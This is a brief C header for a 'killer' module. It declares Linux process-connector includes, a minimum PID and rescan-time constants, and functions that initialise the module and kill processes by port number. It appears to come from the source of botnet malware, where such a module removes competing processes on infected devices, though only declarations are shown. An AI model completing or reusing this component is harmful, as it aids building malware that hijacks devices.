#pragma once

#include <linux/netlink.h>
#include <linux/connector.h>
#include <linux/cn_proc.h>

#include "util.h"

#define KILLER_MIN_PID              400
#define KILLER_RESTART_SCAN_TIME    600

void killer_init(char *, char *);
char killer_kill_by_port(uint16_t);
